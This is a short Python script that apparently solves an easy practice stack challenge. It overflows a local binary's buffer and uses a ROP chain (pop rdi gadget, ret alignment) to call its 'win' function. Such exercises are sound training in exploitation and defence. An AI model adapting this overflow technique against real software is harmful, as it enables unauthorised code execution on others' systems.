from ptrlib import *

binpath = "../../../problems/00-stack/rop/easy"
elf = ELF(binpath)
proc = Process(binpath)


def main():
    payload = b"A" * 0x20
    payload += b"B" * 0x8
    payload += p64(next(elf.gadget("pop rdi; ret")))
    payload += p64(0xdeadbeef)
    payload += p64(next(elf.gadget("ret")))
    payload += p64(elf.symbol("win"))
    proc.sendline(payload)
    proc.interactive()
    return


if __name__ == "__main__":
    main()
